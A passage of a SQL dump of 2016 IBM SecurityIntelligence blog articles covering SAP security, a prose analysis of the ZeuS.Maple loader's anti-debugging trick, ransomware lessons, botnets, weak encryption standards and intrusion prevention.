vulnerabilities is vital for their organizations. Despite this thirst for security knowledge, most organizations don’t believe they have the power to detect an incident. About 47 percent of respondents were “not confident” or claimed “no confidence” that they could detect a breach within a year if their company’s SAP platform was compromised. Additionally, 65 percent of respondents said it is very likely (33 percent) or likely (42 percent) that their company’s SAP platforms have one or more malware infections. Because the threat to business-critical information is increasing, it is essential for companies to separate myths from reality. These myths typically fall into three different categories: A cybersecurity program should be incorporated into the existing enterprise risk management (ERM) process of the company. This will help establish your overall SAP security governance program. Many companies invest heavily in SAP security audits that barely scratch the surface, such as segregation of duties (SOD) checks, basic firefighter log reviews, security log reviews, system parameter reviews, table logging checks and the auditor-favorite SUIM command. Companies should consider investing in more comprehensive and in-depth examinations of their SAP platforms and solutions on a regular basis, including vulnerability assessments and  . Periodic SAP vulnerability assessments should be conducted to identify known vulnerabilities, malware infections, missing patches and notes, insecure configurations, unencrypted interfaces, weak credentials and default settings. This is in addition to the regular SOD checks, custom T-code checks, program analysis and logging regular user activity. Involve the business in security workshops and ask the relevant questions. Who is responsible for preventing a cybersecurity breach? Have we had a SAP security breach? How can our company be sure? Look to invest in an   — meaning a SAP-specific threat vector detection. This will help drive visibility into the cyber world and demonstrate a high level of confidence with your internal and external auditors. Protecting SAP from cyberthreats begins with a shift in beliefs about accessibility, vulnerability and responsibility. A cybersecurity program is only effective when it begins with the appreciation that everything is now connected and therefore accessible. SAP systems and applications, whether in development or production, are as much at stake as any other system. Extending the same (or better) assessments, auditing procedures and tests that you would for any other enterprise platform or application is no different when you consider your valuable investments in and reliance on ERP systems such as SAP.', '\'Advanced Threats\', \'C-Suite\', \'Enterprise Resource Planning (ERP)\', \'Ponemon Institute\', \'SAP\'', 'https://securityintelligence.com/are-you-really-empowered-to-manage-cybersecurity-risks-affecting-your-sap-systems/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (271, 'Unraveling ZeuS.Maple’s Stealth Loader', 'Limor Kessem', '2016-4-7', 'IBM X-Force research routinely analyzes malicious activity to unravel the tricks used by malware to infiltrate machines and carry out its covert activity. In a recent analysis, X-Force researchers noticed a rather interesting loader that was fetching the ZeuS.Maple banking Trojan. Upon examination of the mystery loader, researchers found it was using an interesting twist on what’s known as the self-debugging technique, leveraging Microsoft’s PAGE_GUARD page protection modifier. This technique was, until now, unimplemented in the works of other malware. On top of its use by ZeuS.Maple’s operators, the same loader was identified in the infection process of the Gamarue malware.  is a ZeusVM iteration that was named after its operators’ top target geography: Canada. The Trojan emerged in mid-2014 as what appears to be the property of a closed cybercrime faction. It uses ZeusVM’s code plus a few clever tweaks regularly made by its developer. ZeusVM in itself is a branch of the original Zeus v2.0.8.9’s leaked source code. As a ZeusVM offspring, this Trojan relies on the same core resilience mechanism to make things more complicated for anyone who may attempt to tamper with it. Rather than compiling the entire source code into native machine code, developers made part of it compile into intermediate bytecode that they themselves created. That makes the malware contain a special runtime environment within — hence the name VM, which knows how to execute the intermediate bytecode. The end result of the VM addition to Zeus does not make it harder to detect, and the runtime engine that is compiled is not polymorphic. This feature only makes the malware more resilient to reverse engineering. In terms of its fraud capabilities, ZeuS.Maple is a banking Trojan that features effective data stealing abilities, webinjection mechanisms and the tools to automate illicit transfers out of online bank accounts through a mix of social engineering and remote access to infected machines. At the onset of the analysis, the loader was analyzed with the more common tools that can identify malicious codes run in memory and classify them into the type of malware and malware family. The loader did not allow for this sort of analysis to take place. Rather, it was immediately visible that it was blocking interaction with any of the research tools applied, sending back an Access Denied message upon each run. The same occurred when the loader was subjected to heuristic tests and in-system memory analyses. Since the loader was actively fetching ZeuS.Maple, which is an evolving banking Trojan operated by a closed cybercrime faction, further investigation was applied to reveal the loader’s modus operandi. Some technical information about the research appears in the next section. Loader begins by its own execution and performs system checks to characterize the target endpoint. In this first stage, the loader may look quite benign, with no suspicious behavior on the endpoint. The loader launched a second instance of its own process, but this time it does so as a child process, activating the DEBUG_PROCESS flag. This is used when a debugging process has been started; legitimate debuggers will use this flag. This behavior is reminiscent of another malware loader’s method: ZeroAccess. ZeroAccess is a malware dropper known for using advanced security evasion techniques and its strong anti-research capabilities, which enable it to function as a stealthy delivery platform for any type of malware. At this point, the new loader seemed interesting, but it did not display any new capabilities. In the third stage of its malicious activity on the endpoint, the loader decodes and injects a code chunk into the child process it opened in stage two. This chunk of code does not appear harmless — the first thing it does is launch a series of anti-VM checks and anti-research checks, verifying whether it is run in a testing environment. The series is actually familiar from other  , only here there was something extra that caught our attention: Before execution, pages in memory belonging to the aforementioned child process were marked with the PAGE_GUARD flag enabled. At this point, the loader determines conditions for payload launch have been met. When the code inside the child process is ready to run, the loader passes the actual execution of the payload to a different function. For clarity’s sake we will name that function a DebuggerMachine. This function’s main purpose is to analyze events arriving from the child process during its execution and ensure that deployment runs according to plan. What’s the deployment plan? See Figure 1 for a schematic view, described as follows: If the program starts and an exception is called, do as follows: The execution instructions appear below in Figure 2. Up to this point, the loader successfully executes the flow to install the malware payload it was sent to launch, applying a “self-debugging” trick. What’s the novelty here? Let’s go over a few details. We must keep in a mind a few factors of how the Windows operating system behaves by design. In this case, when code attempts to access a page in memory with the PAGE_GUARD flag enabled (either from the user or from the kernel space), an exception is always raised and then passed to the program running. In this way, the program can be “notified” that its code is being examined. Windows then removes the flag so that subsequent calls to read the protected page will not cause another exception and potential crashes. When Maple’s loader comes into play, it interferes with this mechanism to create a loop: After the Windows kernel removes the PAGE_GUARD flag, it puts it back on. By making the PAGE_GUARD flag permanent on the pages in memory that are of interest to its deployment plan, the loader thwarts the attempts of security software and research tools to examine or interact with its code.  analyzed the detection rate for this threat. Its MD5 hash is 28a022dc9c6bd2f51e77a7db5b27be21. Our research showed that ZeuS.Maple’s operators have adopted the use of a custom loader that employs a new twist designed to bypass and block security researchers from analyzing it. By coding tricks that are less often encountered by researchers, and especially by blocking debugging capabilities, malicious actors hope to evade security and have their malware installed on more endpoints. The direct result is a larger botnet and more options to monetize it! On the flip side of that coin, by unraveling the inner workings of malware loaders,   builds intelligence into threat detection solutions and platforms, bolstering protection from within to stop malware and cybercrime before actual attacks take place.', '\'Advanced Threats\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'X-Force\', \'Zeus\', \'ZeuS.Maple\'', 'https://securityintelligence.com/unraveling-zeus-maples-stealth-loader/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (272, 'The Next Big Thing: Who Drives the Security Agenda?', 'Charles Kolodgy', '2016-4-4', '“What came first, the chicken or the egg?” is a metaphysical mystery. One step right below that, at least in my opinion, is: Who controls the information technology security agenda? Do security solutions arise because vendors believe their technology is required, because users make demands or because the environment forces the issue? Security for the IT infrastructure is critical in establishing a level of trust for Internet activities. Determining the most effective security measures for combating modern threats, however, is a difficult task that can muddy the waters. Two decades ago IT security simply consisted of antivirus, firewalls, passwords and patching. Attackers found ways to overcome those simple solutions, which resulted in vendors producing more  . Many types of security products have been developed since then, but cybercriminals eventually develop capabilities to circumvent or neutralize these defenses. Then the cycle continues. Innovation continues to occur on both sides of the equation. The interplay between users, defenders, vendors and cybercriminals has fostered the creation of a varied and diverse set of protection solutions. But is it possible to predict what types of innovations will be coming next? When you have been involved in IT security for as a long as I have, people ask you what the next big thing will be. Is there something on the horizon that everyone will be talking about in the next year or two? Regrettably, my answer is typically an unsatisfying “I don’t know — it’s up to the attackers.” Where cybercriminals will next concentrate their efforts is unknown. They have the initiative. It is only after new attack techniques are causing damage that security solutions tailored to thwart them are created; the vicious cycle of act and react continues. I’ve begun to believe that we’ve turned the corner. Defenders are now moving in a direction that could take much of the security initiative away from the attackers. The genesis for this change is partly a result of realizing that attackers have an advantage due to how they operate: They receive a force multiplier when they collaborate. By sharing targeting information, vulnerabilities and tools, malicious actors are more effective. Collaboration has been a key component in their ability to stay one step ahead because they are collectively finding ways to bypass new security technologies. The next major innovation in security isn’t a specific tool but an evolving mindset that the protection side shouldn’t go it alone. Defenders have taken note and are now  , to share knowledge and defensive tools in order to improve response to threats, to have a better understanding of what is being targeted and to improve insight into malicious operations. Improving information sharing can foster a sense of collective defense and enable a more proactive defense. By pooling threat trends, especially along industry lines, early warning is possible. This knowledge can aid in pre-empting attacks through vigilance and adjustments, such as creating new firewall rules, embracing virtual patching or closely monitoring privileged access activities. IBM’s collaboration efforts encompass X-Force Exchange and the App Exchange. With  , IBM has opened up 700 terabytes of threat and vulnerability data to security researchers. This vast collection of information enables specialists to rapidly research the latest security threats, aggregate actionable intelligence — which encompasses IP address and URL reputation, Internet application profiles and malware information — and collaborate with peers. All of this allows organizations to see the bigger picture.  is a marketplace for the security community to create and share apps. Third parties can create applications that will allow specialized data to be analyzed, processed and reported. Eventually the program will be extended to other product lines. With these initiatives and those still to come, the attackers will soon not be driving the security agenda.', '\'IBM X-Force Exchange\', \'Information Sharing\', \'Security Tools\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/the-next-big-thing-who-drives-the-security-agenda/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (273, 'Know Your Enemy: Understanding the Motivation Behind Cyberattacks', 'Lyndon Sutherland', '2016-3-31', 'We are often asked what motivates cyberattacks — why attackers do what they do. Sometimes it’s obvious: If a   yields credit and debit card details that are then sold on the Dark Web, profit is quite clearly the motive. Then again, an obvious motivation such as money can be a smokescreen hiding a different, deeper motivation for an attack. The single greatest motivator for cyberattacks in today’s world is, arguably, profit. It comes as no surprise that cybercrime is estimated to become a   by 2019 — and there’s no shortage of attackers who want a share of the pie. Methods of attack that lead to monetary gain abound. Cybercriminals use financial malware such as Carbanak, Dyre, Dridex, Rovnix and Shifu to steal funds directly from victims’ bank accounts. Or they extort money from victims through ransomware such as Cryptolocker and Tesla. Another profit-motivated attack is   attacks, which has grown in popularity over the last few years. Retailers, both online and physical, face a serious threat from profit-motivated attackers who are after user and financial transaction details. Such attacks can involve malware that targets point-of-sale (POS) systems. But profit isn’t always the motive for cybercrime. For example, a private company that develops technology for the military can be the target of industrial espionage. At risk is sensitive information that could have military, economic and political value to the attacker or to the attacker’s paying customer. In this case, attackers could be state-sponsored or a for-profit criminal group acting on behalf of a state or even corporate entity. Organizations that run   — power companies, chemical companies, water systems and the like — could be the target of attackers motivated by sabotage. These cybercriminals in turn can be motivated by underlying political, patriotic or ideological beliefs. There are also more personal — or more vindictive — reasons to explain why attackers do what they do. Companies or individuals can be the target, and the consequences can range from annoying to downright dangerous.', '\'Cybercrime\', \'IBM X-Force Research\', \'Industrial Control Systems (ICS)\', \'X-Force\'', 'https://securityintelligence.com/know-your-enemy-understanding-the-motivation-behind-cyberattacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (274, 'The Silver Lining of a Ransomware Infection', 'Robert Lelewski', '2016-3-30', 'Getting infected with ransomware may actually be a good thing for your enterprise. Ponder that statement for a moment. Yes, someone has written that ransomware, which has cost U.S. businesses and consumers approximately   in the past year, may be a good thing for your environment. In case you have been blissfully unaware of the aggressive ransomware campaigns launched by attackers in the past year, ransomware is malware designed to seek out specific file extensions, encrypt them and then request the end user to pay a fee to have the files decrypted. This fee is typically paid in bitcoin or another digital currency. Ransomware has caused many headaches throughout the industry. According a recent  , 8 out of 10 security leaders surveyed reported they were concerned about ransomware. Let’s consider the capabilities of ransomware. Most variants will seek out file extensions on any mounted drives or network shares the user has access to (including the host and network drives), encrypt the files and ask for payment. It does not currently exfiltrate data from your network, cripple network resources, replicate on its own, allow attackers to traverse your network or contain most of the characteristics of well-known attacks. To the benefit of corporations, ransomware isn’t environmentally aware and can’t tell the difference between the large corporation trying to recover key files worth significant money and a mom attempting to recover baby photos. The ransom is typically the same nominal amount, averaging $700, regardless of who is infected. In short, it’s bad but not   bad. With this primer on ransomware, how can I say ransomware could be beneficial to your environment? The answer is simple: If you have become  , your organization has more than likely had a fundamental breakdown of basic and foundational security practices that has enabled the threat to propagate in its environment. A ransomware infection inadvertently allows an organization the opportunity to identify neglected enterprise shortcomings before something really scary comes along, putting it on the front page of newspapers. If you need a silver lining, think of a ransomware event as a low-cost security assessment pointing out weaknesses in your environment.  has had an influx of calls pertaining to ransomware as more organizations become infected with this nuisance. Almost every call has demonstrated that one or more of the following foundational issues have been sorely neglected within the customer’s enterprise. Many security professionals believe that end users are the weakest link in the organization. If end users are not aware of safe computing practices, they may inadvertently bypass significant investments in information security just by clicking on harmful links or visiting insecure websites. X-Force Incident Response Services has observed a lack of   as a key shortcoming during several recent ransomware engagements. The end user typically enables the ransomware to enter the environment by clicking on a link or an attachment that they should have known not to click on in the first place. Ultimately, a well-trained workforce becomes a very cheap force multiplier for the organization’s security posture. One of the first questions an incident responder asks our customers when they have a ransomware issue is, “Do you have backups of the encrypted files?” More often than not, the response is a slightly embarrassed “no.” Not backing up data is akin to telling the world that the data isn’t worth saving. If the organization is panicking because certain files may be lost, it’s time to re-evaluate your backup methodology. During a recent engagement, an incident responder was asked to determine how ransomware entered the organization’s environment. It was discovered that, despite a high-severity software patch being issued by the developer with a recommendation that the patch be applied within 72 hours, the organization took eight months to apply the patch. A well-known infection vector of ransomware is to exploit poor patching practices and leverage known security vulnerabilities. Leveraging and enforcing the principle of least privilege (PoLP) within an organization is wise for a variety of reasons. Because ransomware also encrypts mounted network locations in addition to the host system, there is the potential for an event to cause damage far beyond patient zero. Enforcing the PoLP within the organization helps mitigate the damage caused by a ransomware event by containing the encryption process to a minimal set of files. It’s not uncommon for X-Force Incident Response Services to receive a call where one user who became infected with ransomware ends up having multiple file shares encrypted that the user had no business need to access. Limiting user access via PoLP helps mitigate the damage caused by ransomware. The defense-in-depth strategy encourages businesses to use a variety of security practices and technology to deter any one threat. Technologies or processes may be circumvented by attackers, and when they are circumvented, a lack of multiple layers enables ransomware to propagate should one defense layer fail. Often, we will have clients that place too much faith in antivirus software but ignore patching. Securing your environment is a multifront campaign, and over-reliance on one strategy may lead to trouble. An essential part of the incident response life cycle is the lessons-learned process. A   isn’t uncommon; many organizations have experienced one — or more. However, if the organization doesn’t take the time to evaluate how it was infected and take steps to shore up identified weaknesses, a new ransomware infection is likely not far around the corner. Sadly, IBM X-Force Incident Response Services will occasionally receive calls from the same client because it did not take the time to examine and address shortcomings, which led to ransomware being in the environment during the first infection. Occasionally, when asked about the state of backups, the infected organization responds with, “We thought we had the data backed up, but it turns out it wasn’t backing up what we thought it was backing up.” Periodic testing to verify your processes are working as intended is key to leveraging those processes when the time comes. No organization wants to be hit by ransomware; it causes nothing but headaches and represents a security failure. However, the occurrence of ransomware almost certainly represents a shortcoming. An organization can then address that so a major threat — such as an attacker attempting to steal your secret sauce or regulated data — is stymied by removing foundational security weaknesses.', '\'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Malware\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/the-silver-lining-of-a-ransomware-infection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (275, 'Black Hats and White Hats: If Cybersecurity Were a Western', 'Johan Arts', '2016-3-30', 'It’s a much-held misconception that all hackers are bad, when in actuality the word hacker doesn’t specifically refer to criminals, bad guys or anything in between. Rather, it is just a word open to subjective interpretation. For ease of labeling, tech writers often refer to three types of hackers:   and gray hats. Just like in a Western film, these terms define the different behavioral groups. Black hats are the cybercriminals who perform illegal activities for personal gain. They’re the bad guys — the Liberty Valances and Ben Wades of the Western scene. Then you have the white hats. These are our heroes; John Wayne, Nathan Brittle and Wyatt Earp are classic examples. In security terms, these are the computer security pros who specialize in penetration testing and other methodologies to ensure the security of an organization’s information systems. Finally, we have the gray hats. Few things fit cleanly into black and white categories, often leaving gray areas; the gray hats fall somewhere in between the good guys and the bad guys. While they don’t work for their own personal gain or to cause specific digital carnage, they may commit crimes or do arguably unethical things in the pursuit of good. If you were to pick a Western character that best fits this description, it would probably be Doc Holliday in “Tombstone.” He’s ultimately a good guy, but has some questionable morals and approaches. \n The state of play in the cybersecurity space is as recognizable as any good Western plot: All the most ruthlessly capable seem to collaborate and communicate far more effectively than the sheriff’s deputies or the good guys. This is exactly the same as in cyberspace. The increasingly ubiquitous nature of the   has given cybercriminals the platform to contact and collaborate with each other far more frequently and easily than ever before. It is now essentially a safe environment for them. In fact, it’s so free from the threat of legal prosecution that it is rapidly turning into a social forum for black-hat best practices and knowledge sharing. Black hats are collaborating far more than the white hats, and it has reached a point where their collaboration has gone beyond mere understating and communication. They are now actually providing a virtual supply chain for all manner of digital malice. The solution for organizations and the white hat community is a simple one, directly inspired by the activities of the black hat community: collaboration and transparency. Due to the nature of cybersecurity, however, the notion of   has been slow to garner support and gather pace. These two words are not areas that, until recently, have been associated with cybersecurity best practice. After all, the notion of security in general would tend to lend itself to the very opposite of the two. But this is not so. The creation of the   platform has opened up a new opportunity for tackling cybercrime. This collaborative, cloud-based platform provides access to volumes of actionable IBM and third-party threat data from across the globe, including real-time indicators of live attacks, which can be used to defend against cybercrime. Just like in “Tombstone” when the Earp posse ride together (with a little help from Doc Holliday) as one, so, too, will the X-Force Exchange give organizations and the white-hat community the opportunity to unite and, with collective strength, strike back at the black hats. Organizations are able to directly interact with security analysts and researchers, as well as their industry peers, via the platform. This collaboration will help validate findings and expose enterprises to similar companies also fighting cybercrime. The transparent use of real-time information is critical to the battle against cybercrime. Thanks to X-Force Exchange, white hats can use the very same tactics employed by their enemies to actually bring about a positive effect. Overcoming long-held dogma in the cybersecurity space will not be instantaneous. After many years of practiced doctrine around isolation and tall (fire) walls, collaboration and transparency will take time for organizations to adapt to. But turning the weapons and approaches used by the black hats against them may well prove a watershed moment in the fight against cybercrime.', '\'Hacking\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/black-hats-and-white-hats-if-cybersecurity-were-a-western/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (276, 'The Bacon of Security: How Threat Intelligence Complements Cloud Protection', 'Pamela Cobb', '2016-3-29', 'Much like the mythical six degrees of separation of  , it seems that you can’t get farther than three clicks on a security provider’s website without running into some mention of threat intelligence. While my hazy, hairspray-induced fondness for “Footloose” is dampened somewhat by the existence of “Wild Things” in the ’90s, I can safely say that X-Force Threat Intelligence is one my favorite security seasonings. While you may not want to see how sausage is made, there is a lot of interest in how   is created. Although I’ve had a rather unfortunate exposure to pig farming thanks to a classmate’s technical process presentation in a college Public Speaking class, I’ll spare you the details. Suffice to say it was quite unsuitable for an 8 a.m. lecture. It’s not idle curiosity to question the sources of threat intelligence. Essential to threat intelligence being useful is that it is accurate and trusted.  sources threat intelligence using a variety of data capture methods. The infrastructure that X-Force uses for collecting data includes a Web crawler, similar in technology to what an Internet search engine would use. It is focused on identifying threats, malicious Web domains, honeypots and darknets that capture network communication indicative of malware, and spam traps for obtaining as much spam as possible. These data collection methods are complemented by further data from 15 billion monitored events from our Security Services clients and 270 million monitored endpoints to collect malware samples. Capturing this data is important; equally important is turning the information collected into insights that can integrate with products and help protect an enterprise. And when in doubt, just add bacon.', '\'Cloud\', \'Cloud Security\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/the-bacon-of-security-how-threat-intelligence-complements-cloud-protection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (277, 'Why Botnets Remain the Go-To Weapon for Cybercriminals', 'Dave McMillen', '2016-3-24', 'For almost two decades, botnets have plagued our networks. Named by combining the words robot and network, a botnet is a network of computers that are infected with malicious software and remotely controlled by cybercriminals known as botmasters. This task force of bots carries out repetitive, nefarious missions issued by their cybercriminal operators. Botnets are extremely hard to detect because they lay dormant until triggered to execute their tasks. Cybercriminals cause harm with botnets in many ways, such as using the Waledac botnet to conduct a pump-and-dump stock spam campaign or launching denial-of-service (DoS) attacks. Botnets can also be used to track victims’ Internet activity, stealing their credentials and personal information. For example, the infamous   was primarily used to steal infected victims’ online banking login credentials and then initiate fraudulent transactions. It resulted in more than $100 million in reported losses. Botnet operators can steal confidential documents, source code, trade secrets or other intellectual property. Botnets are also widely used against political targets by hacktivist groups who control a massive beehive of distributed denial-of-service (DDoS) bots. They use these bots to take down government websites, and some even implement them in an effort to extort victims into paying a ransom in exchange for  . The resiliency of botnets continues to surprise security analysts and law enforcement. In December 2015, IBM X-Force malware researchers found a new variant of the   banking Trojan and botnet less than a year after it was taken down. While we have seen spam botnets come back after being taken down, this is the first time we have seen a banking botnet come back to life. Aside from new and reappearing botnets, another, newer angle to this threat is the   — a botnet composed of infected Internet of Things (IoT) devices. These types of malicious activities, whether they leverage botnets or newer thingbots, can wind up costing businesses millions to remediate because they are primarily responsible for the loss of money and personal information of customers and employees. Botnet components are widely available on the Dark Web, which makes them an appealing and effective tool for attackers.   takes a look at botnets in detail and at one particular botnet for sale in an underground marketplace. The report highlights the most commonly used botnet protocols, malicious uses of botnets and the botnet trends observed from IBM Managed Security Services data.', '\'Banking Trojan\', \'Botnets\', \'Cybercrime\', \'Internet of Things (IoT)\', \'Thingbots\', \'Trojan\'', 'https://securityintelligence.com/why-botnets-remain-the-go-to-weapon-for-cybercriminals/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (278, 'Living in the Past: Business Encryption Needs to Get With the Times or Get Hacked', 'Bill O\'Donnell', '2016-3-22', 'In popular culture, what’s old is new. Unfortunately, there is a retro trend that is putting many businesses, and the businesses with whom they interact, at great risk. Since 2014, security researchers have found a variety of flaws — in code and implementation — that undermined trust in foundational encryption standards that have been in place since 1998. Highly publicized vulnerabilities with names such as BEAST, POODLE, POODLE V2, Logjam, Bar Mitzvah, STORM and FREAK have prompted headlines and fervent discussion about the underpinnings of security and privacy.  , or Decrypting RSA with Obsolete and Weakened Encryption, was disclosed earlier this month and is the latest vulnerability to draw attention to this serious issue. Unfortunately — and unsettlingly — while the call to action was definitive, the reaction was not. Although the industry has responded and removed vulnerabilities in successive (and in some cases multiple) versions, many businesses continue to depend on these outdated encryption standards, putting themselves and the information they handle in danger. Cybercriminals are predators. They identify and prey on weakness. In some of these cases, they exploited that weakness. Now that the vulnerabilities of numerous standards have been laid bare, it’s only a matter of time before organizations are targeted. If this trend continues, the shortcomings of every aspect of these old encryption standards will be fully exposed.  detailed the history and evolution of these encryption standards, the efforts to mitigate issues and the recommendations for businesses to modernize their use of encryption standards and lower their overall risk of a data breach. This brief blog endeavors to answer the most prominent questions. These old   were designed for the technology of the systems they were built to protect. Early standards afforded protection because the processing power of computers and networks in the 1990s were not sufficient for an adversary to perform a brute-force attack (trying every key combination to decrypt data) against the encryption algorithms. As processing power increased, so did the need to update the standards to fortify them against a stronger enemy. Updated versions of these encryption standards, based on more current computing power and parallel processing, were published in 2008. The big challenge in moving to more modern encryption standards is that the entire business ecosystem must move to these standards and the platforms that support them. Most software and hardware vendors are supporting the newer encryption standard, but the shift requires businesses to invest in and move to current releases. Historically, businesses — to avoid high costs and disruption — lag in new platform adoption. This is also an issue for businesses that have updated systems but still need to support older standards to communicate with partners who have not. The IBM report provides information and recommendations for a long-term strategy aimed at reducing the   due to outdated encryption. The most obvious action is moving to the 2008 modernized encryption standards available today and supported by most vendors. The report also provides short-term mitigation strategies and looks briefly at what the community is already doing with regard to the next generation of these encryption standards.', '\'Advanced Threats\', \'Cybersecurity\', \'Encryption\', \'Malware\', \'Threat Intelligence\'', 'https://securityintelligence.com/living-in-the-past-business-encryption-needs-to-get-with-the-times-or-get-hacked/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (279, 'Is It the Breadth of the Breach or the Value of the Volume?', 'Pamela Cobb', '2016-3-18', 'When we released the “ ” recently, we thought twice about comparing the breach statistics year over year. The previous report was a rallying cry around the volume of records with several mega-breaches, including many in the retail industry, in 2014 that brought the tally up to 1 billion records of stolen data. The 2015 totals were lower but different in tenor and composition. Rather than a flood of exfiltrated payment card details and account credentials, we saw instead health care-specific breaches and the leak of salacious personal details from adult dating sites. What 2015 lacked in volume, it appeared to have made up in value in the black market. Looking at the bubble chart that shows year-over-year breach trends, we can see the highlights of the estimated impact of the incidents. \n To quantify the impact, however, we need to bring in another data set. The cost to an organization to recover from a breach includes direct expenses such as hiring forensics experts, hotline support and paying for credit monitoring, as well as indirect costs such as client turnover and brand damage and internal investigations. The Ponemon Institute’s “ ” put that overall average cost per record at $154. That figure excludes aforementioned mega-breaches because of potential additional costs like legal fees. Does a cybercriminal get to sell that record for $154 on the Dark Web? Not even close. Because of the oversupply of PII and financial data for sale on the Internet underground, the value of these records has plummeted. According to  , common PII records like stolen credit cards or Social Security numbers can be sold for $1–3 and $15, respectively — well below the cost to the organization that was attacked in the first place. While common PII records are relatively inexpensive on the  , the potential to build a more complete profile of an individual that includes items such as user credentials for social media sites, behavioral information from dating websites and health care records are the stuff of dreams for cybercriminals. One such example is the case of compromised health care records. Attackers could resell these complete health profiles to enable medical fraud. The NBC News article cited that complete health care records sell for $60 apiece. That is a paltry amount compared to the estimated cost per record to the breached organization of $363, or more than double the overall average of $154 cited above. Having the start of a social profile for a person on the Internet can bring the attackers closer to building a full profile of the individual, making it easier to socially engineer an attack. In a more brazen attack, the intimate nature of bedroom behaviors gathered from a   was used to extort money from site members whose data was leaked. The attackers are not generally interested in the salacious details of our personal lives unless they can be used for a payday. I confess that one of my favorite lines of the   report was that 2015 was “not a complete disaster,” particularly since we said earlier that 2014 was the year that the Internet fell apart. Subtlety, thy name is security research reports. To help make things less of a disaster for yourself, consider returning to security fundamentals. Use unique passwords across all your website logins; it’s more difficult for attackers to build a complete profile if it’s harder to jump from one account to another. Don’t write your passwords on a sticky note on your monitor, particularly if your computer is going to be filmed on national television, as was the case in one French broadcasting network.', '\'Dark Web\', \'Data Breach\', \'Healthcare Industry\', \'IBM X-Force Research\', \'Password\', \'Personally Identifiable Information (PII)\', \'X-Force\'', 'https://securityintelligence.com/is-it-the-breadth-of-the-breach-or-the-value-of-the-volume/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (280, 'Evolving Threats: Why Deep Packet Inspection Is Critical for Intrusion Prevention', 'Jordan Carlson', '2016-3-16', 'Imagine what would happen if the police in a major city regularly published their plans to stop crime and catch thieves, including where all patrols are every hour. Do you think crime would go up? Do you think successful robberies would increase? Now think about network intrusion prevention. Some of the most widely used   signatures are freely available online for anyone to download. I’m willing to bet that most cybercriminals have studied those rules and are constantly inventing new ways to beat them. The fact that nearly all of these rules are based on pattern-matching — a method of identifying known threats and exploits — only continues to increase an attacker’s chance of success in breaching your network and getting to your business-critical data. Commonly, IPSs have focused on preventing specific exploits or known attack patterns. Using these pattern-based signatures, when an IPS found something it knew to be a threat, it could stop it. But developing a signature for each and every known exploit (as opposed to focusing on protection at the vulnerability level) was and is an onerous task, and using so many signatures can severely degrade the performance of your network security devices. Sacrificing network performance for protection was not an attractive trade-off. There is a long-standing debate on the  . The simple truth is that the nature of threats has evolved over time. There has been a steady rise in unknown threats, such as zero-day attacks and mutated threats, compounded by advanced evasion techniques that obfuscate a strike. By definition, we do not yet have a pattern-based signature for the threats we’ve never seen before. So it begs the question: How do we stop this growing number of unknown threats? Pattern-matching signatures, while helpful in some instances, are simply no match for the tidal wave of evolving threats most organizations are up against today. But if you were able to inspect the content inside the data packets traveling along your network as opposed to just looking for known patterns, you would be in a much better position to protect yourself. That’s where deep packet inspection (DPI) can help. DPI is software technology that provides the ability to inspect any network packet to its very end. The advantages of doing so are clear: Full parsing of the content layers of the packet (layers six and seven) is the only reliable way to detect some of the most dangerous attacks, which are often mutated or obfuscated using embedded content, special encoding schemes, compression or nonstandard syntax. By inspecting and recognizing the entire application payload of a packet, DPI enables intelligent security threat detection with heuristics and behavioral-based rule sets that is simply not possible with pattern-matching technology. Since 1999, IBM’s intrusion prevention products have been using deep packet inspection to protect networks. The core IPS protection engine is the IBM Protocol Analysis Module (PAM), developed by IBM X-Force. PAM offers full DPI through layer seven and   to its findings to identify both known and unknown threats, even within encrypted traffic. It is highly tuned to block suspicious content while letting legitimate traffic pass through. Additionally, our next-generation IPS offers throughput speeds of up to 25 Gbps, so you don’t need to sacrifice performance for protection. So that malware hiding inside an image inside the PDF file you received attached to an encrypted email? Yeah, we can detect and block that. If you’d like to learn more about the IBM Protocol Analysis Module, watch the on-demand webinar “ .” Not only will you learn more about PAM and how it works, but our IBM X-Force team will discuss specific examples of how PAM’s unique approach has protected against vulnerabilities months and even years before exploits were disclosed.', '\'Advanced Threats\', \'Intrusion Prevention System (IPS)\', \'Network Protection\', \'Network Security\', \'X-Force\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/evolving-threats-why-deep-packet-inspection-is-critical-for-intrusion-prevention/');
